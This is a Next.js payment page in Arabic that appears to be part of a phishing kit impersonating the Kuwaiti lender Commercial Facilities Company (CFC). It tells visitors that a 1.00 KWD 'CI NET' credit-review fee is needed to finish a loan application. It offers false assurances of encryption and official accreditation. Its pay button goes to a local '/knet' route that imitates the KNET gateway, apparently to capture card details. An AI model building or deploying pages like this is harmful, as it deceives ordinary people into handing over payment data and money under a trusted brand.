"use client";

import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import {
  Menu,
  ChevronRight,
  Check,
  CreditCard,
  Shield,
  Lock,
  Clock,
  AlertCircle,
  ArrowRight,
  CheckCircle,
} from "lucide-react";
import { useRouter } from "next/navigation";
import { useState } from "react";

export default function PaymentPage() {
  const [isProcessing, setIsProcessing] = useState(false);
  const router = useRouter();

  const handlePayment = () => {
    setIsProcessing(true);
    // Simulate processing delay before redirect
    setTimeout(() => {
      router.push("/knet");
    }, 800);
  };

  return (
    <div
      className="min-h-screen bg-gradient-to-b from-gray-50 to-white"
      dir="rtl"
    >
      {/* Header */}
      <header className="sticky top-0 z-50 bg-gradient-to-r from-blue-600 via-blue-700 to-blue-800 text-white shadow-lg backdrop-blur-sm">
        <div className="flex items-center justify-between max-w-md mx-auto p-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 bg-white/10 backdrop-blur-md rounded-xl flex items-center justify-center shadow-lg border border-white/20">
              <img
                src="/next.svg"
                width={70}
                alt="CFC Logo"
                className="brightness-0 invert"
              />
            </div>
            <div className="flex flex-col">
              <span className="font-bold text-lg tracking-tight">CFC</span>
              <span className="text-xs text-blue-100">مراجعة الائتمان</span>
            </div>
          </div>
          <button className="w-10 h-10 rounded-lg bg-white/10 backdrop-blur-md flex items-center justify-center hover:bg-white/20 transition-all border border-white/20">
            <Menu className="w-5 h-5" />
          </button>
        </div>
      </header>

      {/* Progress Indicator */}
      <div className="max-w-md mx-auto px-6 py-6">
        <div className="flex items-center justify-between mb-2">
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
              <Check className="w-5 h-5 text-white" />
            </div>
            <span className="text-xs font-semibold text-green-600">
              المعلومات
            </span>
          </div>
          <div className="flex-1 h-0.5 bg-green-500 mx-2"></div>
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
              <Check className="w-5 h-5 text-white" />
            </div>
            <span className="text-xs font-semibold text-green-600">الراتب</span>
          </div>
          <div className="flex-1 h-0.5 bg-blue-600 mx-2"></div>
          <div className="flex items-center gap-2">
            <div className="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center shadow-md">
              <CreditCard className="w-4 h-4 text-white" />
            </div>
            <span className="text-xs font-semibold text-blue-600">الدفع</span>
          </div>
        </div>
        <div className="w-full bg-gray-200 rounded-full h-2">
          <div className="bg-gradient-to-r from-green-500 via-blue-600 to-blue-700 h-2 rounded-full w-full transition-all duration-500"></div>
        </div>
      </div>

      {/* Main Content */}
      <div className="max-w-md mx-auto px-6 pb-8 space-y-6">
        {/* Security Badges */}
        <div className="grid grid-cols-3 gap-3">
          <Card className="border-0 shadow-sm bg-gradient-to-br from-green-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto">
                <Shield className="w-5 h-5 text-green-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">دفع آمن</p>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm bg-gradient-to-br from-blue-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto">
                <Lock className="w-5 h-5 text-blue-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">مشفر ١٠٠٪</p>
            </CardContent>
          </Card>

          <Card className="border-0 shadow-sm bg-gradient-to-br from-purple-50 to-white">
            <CardContent className="p-3 text-center space-y-2">
              <div className="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center mx-auto">
                <Clock className="w-5 h-5 text-purple-600" />
              </div>
              <p className="text-xs font-semibold text-gray-700">فوري</p>
            </CardContent>
          </Card>
        </div>

        {/* Main Payment Card */}
        <Card className="shadow-xl border-0 overflow-hidden">
          <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-6 text-center">
            <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center mx-auto mb-4 border border-white/30">
              <CheckCircle className="w-8 h-8 text-white" />
            </div>

            <p className="text-sm text-blue-100">
              الخطوة الأخيرة لإتمام طلب التمويل
            </p>
          </div>

          <CardContent className="p-6 space-y-6">
            {/* Explanation */}
            <div className="text-center space-y-3">
              <p className="text-gray-700 leading-relaxed">
                نشكركم على تقديم طلب التمويل لدى شركة التسهيلات التجارية.
              </p>

              <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                <p className="text-gray-800 leading-relaxed">
                  لضمان استكمال إجراءات الطلب، يرجى سداد رسوم خدمة سای نت وقدرها
                  <span className="font-bold text-blue-600 text-xl mx-1">
                    1.00 دينار
                  </span>
                  لمراجعة السجل الائتماني الخاص بكم.
                </p>
              </div>

              <p className="text-sm text-gray-600">
                سداد هذه الرسوم يعد خطوة أساسية لاستكمال تقييم طلبكم.
              </p>
            </div>

            {/* Payment Amount Breakdown */}
            <div className="bg-gray-50 rounded-xl p-4 space-y-3">
              <div className="flex items-center justify-between pb-3 border-b border-gray-200">
                <span className="text-gray-600">
                  رسوم مراجعة السجل الائتماني
                </span>
                <span className="font-semibold text-gray-900">1.00 د.ك</span>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-lg font-bold text-gray-900">
                  المبلغ الإجمالي
                </span>
                <span className="text-2xl font-bold text-blue-600">
                  1.00 د.ك
                </span>
              </div>
            </div>

            {/* Payment Button */}
            <Button
              onClick={handlePayment}
              disabled={isProcessing}
              className="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white h-14 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isProcessing ? (
                <span className="flex items-center gap-2">
                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                  جاري التحويل...
                </span>
              ) : (
                <span className="flex items-center gap-2 justify-center">
                  <CreditCard className="w-5 h-5" />
                  الدفع عبر كي نت
                  <ChevronRight className="w-5 h-5" />
                </span>
              )}
            </Button>

            {/* Security Notice */}
            <div className="flex items-start gap-3 bg-green-50 border border-green-200 rounded-lg p-3">
              <Shield className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
              <div>
                <p className="text-sm font-semibold text-green-900 mb-1">
                  عملية دفع آمنة ومشفرة
                </p>
                <p className="text-xs text-green-700 leading-relaxed">
                  سيتم تحويلك إلى بوابة كي نت الآمنة لإتمام عملية الدفع
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* CI NET Information Card */}
        <Card className="shadow-lg border-0 overflow-hidden">
          <div className="relative h-32 bg-gradient-to-l from-yellow-400 via-blue-500 to-blue-700 overflow-hidden">
            <div className="absolute inset-0 bg-gradient-to-l from-yellow-400/20 via-blue-500/40 to-blue-700/60"></div>
            <div
              className="absolute inset-0 opacity-30"
              style={{
                backgroundImage: `radial-gradient(circle at 20% 50%, rgba(255,255,255,0.2) 1px, transparent 1px),
                               radial-gradient(circle at 40% 20%, rgba(255,255,255,0.2) 1px, transparent 1px),
                               radial-gradient(circle at 60% 80%, rgba(255,255,255,0.2) 1px, transparent 1px),
                               radial-gradient(circle at 80% 40%, rgba(255,255,255,0.2) 1px, transparent 1px)`,
                backgroundSize: "40px 40px, 60px 60px, 50px 50px, 45px 45px",
              }}
            ></div>

            <div className="relative z-10 flex items-center justify-center h-full">
              <div className="text-center">
                <div className="text-white text-3xl font-bold mb-1">
                  CI<span className="text-yellow-300">NET</span>
                </div>
                <div className="text-white text-sm">سای نت</div>
              </div>
            </div>
          </div>

          <CardContent className="p-6 space-y-4">
            <div className="text-center">
              <h3 className="text-lg font-bold text-blue-600 mb-2">
                مراجعة تاريخ الائتمان
              </h3>
              <p className="text-sm text-gray-600 mb-4">
                سای نت هي الجهة المعتمدة لتقييم السجل الائتماني في الكويت
              </p>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div className="bg-blue-50 rounded-lg p-3 text-center">
                <CheckCircle className="w-6 h-6 text-blue-600 mx-auto mb-2" />
                <p className="text-xs font-semibold text-gray-700">
                  معتمد رسمياً
                </p>
              </div>
              <div className="bg-green-50 rounded-lg p-3 text-center">
                <Shield className="w-6 h-6 text-green-600 mx-auto mb-2" />
                <p className="text-xs font-semibold text-gray-700">
                  آمن وموثوق
                </p>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Why This Step Card */}
        <Card className="bg-gradient-to-br from-blue-600 via-blue-700 to-blue-800 text-white rounded-2xl shadow-xl overflow-hidden border-0">
          <CardContent className="p-6 relative">
            {/* Background Decorations */}
            <div className="absolute top-0 right-0 w-24 h-24 bg-white/5 rounded-full -translate-y-12 translate-x-12"></div>
            <div className="absolute bottom-0 left-0 w-20 h-20 bg-white/5 rounded-full translate-y-10 -translate-x-10"></div>

            {/* Content */}
            <div className="relative z-10 space-y-4">
              <div className="flex items-center gap-3 mb-4">
                <div className="w-10 h-10 bg-white/20 rounded-lg flex items-center justify-center backdrop-blur-sm">
                  <AlertCircle className="w-6 h-6" />
                </div>
                <h3 className="text-lg font-bold">لماذا هذه الخطوة؟</h3>
              </div>

              <div className="space-y-3 text-sm">
                <div className="flex items-start gap-3 bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <Check className="w-5 h-5 flex-shrink-0 mt-0.5" />
                  <p>تقييم دقيق لقدرتك على السداد</p>
                </div>
                <div className="flex items-start gap-3 bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <Check className="w-5 h-5 flex-shrink-0 mt-0.5" />
                  <p>حماية حقوقك المالية</p>
                </div>
                <div className="flex items-start gap-3 bg-white/10 backdrop-blur-sm rounded-lg p-3 border border-white/20">
                  <Check className="w-5 h-5 flex-shrink-0 mt-0.5" />
                  <p>الحصول على أفضل عرض تمويلي</p>
                </div>
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Back Button */}
        <div className="text-center pt-4">
          <Button
            variant="outline"
            onClick={() => router.back()}
            className="px-6 py-2 bg-white border-gray-300 hover:bg-gray-50"
          >
            <ArrowRight className="ml-2 h-4 w-4" />
            العودة
          </Button>
        </div>
      </div>
    </div>
  );
}
